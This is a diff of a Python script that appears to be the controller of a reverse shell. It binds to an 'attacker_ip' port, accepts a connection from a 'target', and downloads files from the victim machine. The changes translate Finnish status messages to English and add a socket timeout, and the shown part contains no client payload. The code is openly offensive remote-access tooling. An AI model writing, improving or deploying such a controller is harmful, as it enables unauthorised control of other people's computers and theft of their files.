@@ -1,6 +1,8 @@
 import socket
 import os
 
+socket.setdefaulttimeout(15)
+
 def clear_screen():
     os.system('cls')
 
@@ -12,7 +14,7 @@ def download(target, command):
             bits = target.recv(1024)
             if b'DONE' in bits:
                 f.write(bits[:-4])
-                print('Siirto valmis')
+                print('Transfer complete')
                 break
             elif b'File not found' in bits:
                 print('File not found')
@@ -32,12 +34,12 @@ def main():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((attacker_ip, port))
     s.listen(1)
-    print(f'[+] Odotetaan uutta yhteyttä...\n')
+    print(f'[+] Awaiting for connection...\n')
     #accept metodi palauttaa -> target == itse yhteys kohteeseen
     # target_addr == tuple jossa index0 :ssa targetin ip ja index1:ssa väliaikaisportti
     target, target_addr = s.accept()
 
-    print(f'[+] Uusi yhteys kohteesta {target_addr[0]}')
+    print(f'[+] New connection from {target_addr[0]}')
 
     while True:
         #encodataan stringgi byteiksi että voidaan kuljettaa kohteeseen
